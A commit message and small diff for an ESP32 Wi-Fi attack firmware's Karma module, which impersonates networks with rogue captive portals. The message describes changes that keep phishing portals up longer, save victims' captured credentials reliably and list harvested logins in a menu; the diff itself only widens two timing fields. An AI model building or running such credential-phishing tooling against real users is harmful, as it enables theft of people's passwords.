karma: keep portals up for 5 minutes and fix credential reporting
Karma's background portals were being torn down long before a victim could
finish filling in the captive portal form, and the credentials that did get
captured were invisible from the Karma menu.

checkPortals() had two problems:

  * savePortalCredentials() was unreachable. The function returned early on
    "if (hasCredentials()) { destroyActivePortal(); return; }" before ever
    reaching the save block at the bottom. ESPAsyncWebServer raises that flag
    from its own task at an arbitrary point between heartbeats, so the early
    return always won the race. /PortalCreds was never even created.

  * The lifetime rules were far too aggressive. A portal with no "engagement"
    died after 15s, and an engaged one died 30s after the last page view
    (hasRecentPageView()), which is well inside the time it takes to type a
    username and a password on a phone's captive portal browser. The AP
    disappeared mid-form and the POST never arrived.

Replace both with a single deadline: the portal stays up for
KARMA_PORTAL_DWELL_MS (5 minutes) from launch, credentials are persisted as
soon as they appear, and the portal is no longer destroyed on the first
capture so several clients on the same ESSID can be served.

Note that only one portal can exist at a time. The ESP32 has a single softAP
interface, so Karma is inherently serialised: one ESSID is impersonated, then
the next. A longer dwell therefore means fewer ESSIDs covered per session,
which is the intended trade-off here.

Also:

  * AttackConfig.baseDuration / extendedDuration widened to uint32_t. They
    hold milliseconds and overflowed a uint16_t; extendedDuration = 180000
    silently became 48928.

  * PORTAL_MAX_IDLE now tracks KARMA_PORTAL_DWELL_MS so the on-screen
    countdown matches the real teardown deadline instead of showing 60s.

  * Pending portal expiry raised from 5 to 15 minutes, since each portal now
    occupies a full 5 minute slot and the queue drained faster than it could
    be served.

  * ~EvilPortal() now stops the web server and the DNS server. The DNS server
    is a process-wide singleton shared by every portal instance and nothing
    stopped it on teardown, so a destroyed Karma portal left it answering
    queries with a softAP address that no longer existed.

  * "View Captures" gains a "Creds: N" entry that counts and browses
    /BruceEvilCreds/*.csv. The menu previously reported only on /PortalCreds
    and so showed "no captures" even while credentials were being harvested
    correctly by EvilPortal::saveToCSV().

+++ src/modules/wifi/karma_attack.h
@@ -185,8 +185,10 @@ typedef struct {
     uint16_t fastTierDuration;
     uint32_t cloneDuration;
     uint8_t maxCloneNetworks;
-    uint16_t baseDuration;
-    uint16_t extendedDuration;
+    // Widened to 32 bit: these hold milliseconds and overflowed a uint16_t
+    // (extendedDuration = 180000 silently became 48928).
+    uint32_t baseDuration;
+    uint32_t extendedDuration;
 } AttackConfig;
 
 // Handshake capture structure
